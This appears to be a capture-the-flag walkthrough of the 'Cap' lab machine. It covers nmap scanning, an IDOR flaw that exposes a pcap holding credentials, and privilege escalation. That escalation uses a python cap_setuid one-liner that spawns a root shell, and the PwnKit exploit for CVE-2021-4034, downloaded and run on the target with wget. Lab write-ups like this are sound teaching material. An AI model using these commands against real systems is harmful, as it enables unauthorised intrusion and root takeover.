---------------
Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**
2. Scan for **services** in these open ports
3. Scan for **vulnerabilities** in these services

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.10.245 -p- -T4 --min-rate 5000 -oG all_ports.txt --open -n -Pn
```

![All Ports](/assets/Cap/1.png)
<br />
<br />
<br />

There are **3 open ports**:
+ **21/tcp**
+ **22/tcp**
+ **80/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.245 -p 21,22,80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![Services](/assets/Cap/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **21/tcp vsftpd 3.0.3**
+ **22/tcp OpenSSH 8.2p1**
+ **80/tcp gunicorn**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.245 -p 21,22,80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn -v
```

<br />
<br />
<br />

We only detect a **DoS vulnerability** for the **http service**, which is not useful.

### Foothold

This machine's foothold was too much **CTF-like** for my taste. After investigating for possible vulnerabilities related to the services and its versions, I visited the website, where we are logged in as Nathan.

![Dashboard](/assets/Cap/4.png)
<br />
<br />
<br />

Enumerating the website, we discover **4 pages**:
- **/data**
- **/ip**
- **/netstat**
- **/capture**

<br />

We are interested in the ***/data* and */capture* pages**, these pages interact among them in a particular way. When you click on the menu option ***Security Snapshot (5 Second PCAP + Analysis)***, we are actually going to the */capture* page, this page launch a ``tcpdump`` command for 5 seconds and then redirects us to the */data* page, where we can download a **pcap file** with this data.

<br />

However, this is not exactly what we are interested in. When redirected to the data page, we can see a **number in the URL identifying the capture file**.

![Menu](/assets/Cap/5.png)
<br />
<br />
<br />

The first capture we do starts by number 1, however, we can **modify the URL** to access the **capture 0**, confirming and **IDORs vulnerability**.

<br />
<br />

This pcap file contains what we are looking for:

<br />
<br />
<br />

With the **credentials for the user nathan**, which works for both **ssh and ftp**, we have obtained a foothold in the target machine.

### Privilege Escalation

For this machine, I discovered **two ways to escalate privileges**, the conventional one and an alternative one.

<br />
#### Conventional Privilege Escalation

The conventional privilege escalation method works through **capabilities**:

```bash
getcap -r / 2>/dev/null
```

![Capabilities](/assets/Cap/9.png)
<br />
<br />
<br />

The ***python3.8* binary** has the ***cap_setuid* capability** assigned to it, which allows us to **change the UID of a process**. For the privilege escalation we only have to **spawn a shell with an UID of 0**.

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<br />
<br />
<br />

#### Alternative Privilege Escalation

The alternative privilege escalation method works through **CVE-2021-4034**, which is based on giving **SUID permission to an old version of the pkexec binary**:

```bash
find / -perm -4000 -ls 2>/dev/null
```

![SUID](/assets/Cap/11.png)
<br />
<br />
<br />

To exploit this vulnerability I used the [PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"} created by **ly4k**, we just have to download it in our machine:

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
sudo python3 -m http.server 80
```
<br />

And then **transfer it to the target machine and run it**:

```bash
wget http://10.10.16.5/PwnKit
chmod +x PwnKit
./PwnKit
```
